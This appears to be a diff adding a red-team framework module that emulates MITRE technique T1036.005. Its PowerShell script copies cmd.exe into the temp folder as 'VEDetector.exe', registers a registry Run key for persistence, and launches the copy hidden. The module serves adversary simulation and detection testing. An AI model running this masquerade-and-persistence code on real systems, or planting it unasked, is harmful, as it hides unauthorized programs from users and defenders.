@@ -1,0 +1,87 @@
+name: Masquerade-Location
+authors:
+  - name: Anthony Rose
+    handle: '@Cx01N'
+    link: https://twitter.com/Cx01N_
+description: |
+  Copies a system binary (e.g., cmd.exe) with a legitimate-looking
+  name to a non-standard location and optionally sets a registry Run
+  key for persistence. This simulates adversary behavior of
+  masquerading as a legitimate application by matching legitimate
+  names or locations while actually running a renamed system utility.
+software: ''
+tactics: [TA0005]
+techniques: [T1036.005]
+background: true
+output_extension:
+needs_admin: false
+opsec_safe: false
+language: powershell
+min_language_version: '2'
+comments:
+  - https://github.com/redcanaryco/atomic-red-team
+options:
+  - name: SourceFile
+    description: Path to the source binary.
+    required: false
+    value: 'C:\Windows\System32\cmd.exe'
+  - name: DestinationPath
+    description: Directory to place the masqueraded binary.
+    required: false
+    value: '$env:TEMP'
+  - name: DestinationName
+    description: New name for the masqueraded binary.
+    required: false
+    value: 'VEDetector.exe'
+  - name: AddRunKey
+    description: Add a registry Run key for persistence (true/false).
+    required: false
+    value: 'true'
+    suggested_values:
+      - 'true'
+      - 'false'
+  - name: OutputFunction
+    description: PowerShell output function to use.
+    required: false
+    value: 'Out-String'
+    suggested_values:
+      - Out-String
+      - ConvertTo-Json
+script: |
+  function Invoke-MasqueradeLocation {
+      param(
+          [string]$SourceFile,
+          [string]$DestinationPath,
+          [string]$DestinationName,
+          [string]$AddRunKey = "true"
+      )
+
+      $destPath = $ExecutionContext.InvokeCommand.ExpandString($DestinationPath)
+      $destFile = Join-Path $destPath $DestinationName
+
+      if (-not (Test-Path $SourceFile)) {
+          Write-Output "[-] Source file not found: $SourceFile"
+          return
+      }
+
+      Copy-Item -Path $SourceFile -Destination $destFile -Force
+      Write-Output "[+] Copied $SourceFile to $destFile"
+
+      if ($AddRunKey.ToLower() -eq "true") {
+          New-ItemProperty -Path "HKCU:\Software\Microsoft\Windows\CurrentVersion\Run" -Name $DestinationName.Replace('.exe','') -Value $destFile -PropertyType String -Force | Out-Null
+          Write-Output "[+] Added Run key: $($DestinationName.Replace('.exe','')) -> $destFile"
+      }
+
+      try {
+          $proc = Start-Process -FilePath $destFile -PassThru -WindowStyle Hidden
+          Write-Output "[+] Launched $destFile (PID: $($proc.Id))"
+          Start-Sleep -Seconds 3
+          Stop-Process -Id $proc.Id -Force -ErrorAction SilentlyContinue
+          Write-Output "[+] Process stopped."
+      } catch {
+          Write-Output "[-] Failed to execute: $_"
+      }
+  }
+script_end: Invoke-MasqueradeLocation -SourceFile "{{ SourceFile }}" -DestinationPath
+  "{{ DestinationPath }}" -DestinationName "{{ DestinationName }}" -AddRunKey "{{
+  AddRunKey }}" {{ PARAMS }} | {{ OUTPUT_FUNCTION }}
